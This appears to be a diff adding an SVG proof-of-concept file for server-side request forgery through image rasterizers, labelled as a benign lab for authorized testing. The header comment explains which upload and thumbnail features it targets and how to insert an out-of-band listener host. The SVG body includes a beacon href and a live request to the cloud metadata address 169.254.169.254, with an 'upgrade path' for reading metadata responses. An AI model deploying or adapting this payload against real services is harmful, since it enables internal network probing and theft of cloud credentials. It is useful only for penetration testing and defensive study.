@@ -1,0 +1,39 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  Safe PoC -> x8bitranjit.
+  Benign PoC lab - x8bitranjit style. Authorized security testing only.
+
+  WHAT THIS DEMONSTRATES: SSRF via SVG - server-side SVG rasterizers
+  (thumbnail generators, image converters, avatar pipelines) FETCH external
+  URLs referenced inside the SVG (<image xlink:href>). No script involved -
+  this is the pure SSRF beacon variant (see svg_xss_open_on_view.svg for XSS).
+
+  WHERE IT FIRES: any feature that (a) accepts SVG uploads and (b) processes
+  them server-side: thumbnails, previews, watermarking, AI-tagging,
+  image-to-PNG conversion.
+
+  WHAT TO EDIT: replace  YOUR-OOB-HOST.example.invalid  (twice) with your
+  listener (interactsh/Collaborator). ".invalid" never resolves -> inert
+  as shipped. A callback FROM THE TARGET's processing worker = SSRF proven.
+
+  UPGRADE PATH (authorized): point href at http://169.254.169.254/latest/
+  meta-data/ to read the response into the rendered image (file-read/SSRF
+  combo - see SSRF kit rows 044/048 and CLD-004).
+-->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="640" height="320">
+  <rect width="640" height="320" fill="#fafafa"/>
+  <text x="24" y="80" font-size="18" font-family="Arial">
+    Benign SVG-SSRF beacon PoC.
+  </text>
+  <text x="24" y="120" font-size="14" font-family="Arial">
+    If a server-side renderer processes this file, it fetches the two
+    hrefs below - the OOB callback proves SSRF.
+  </text>
+  <image xlink:href="http://ssrf-svg.YOUR-OOB-HOST.example.invalid/beacon.png" x="24" y="140" width="16" height="16"/>
+  <image xlink:href="http://169.254.169.254/latest/meta-data/" x="24" y="180" width="16" height="16"/>
+  <text x="24" y="240" font-size="12" font-family="Arial">
+    (second href is metadata: it only proves internal reach if the worker
+     echoes errors/timing - the first href is the reliable OOB beacon)
+  </text>
+  <text x="24" y="270" font-size="12" font-family="Arial">Safe PoC -&gt; x8bitranjit</text>
+</svg>
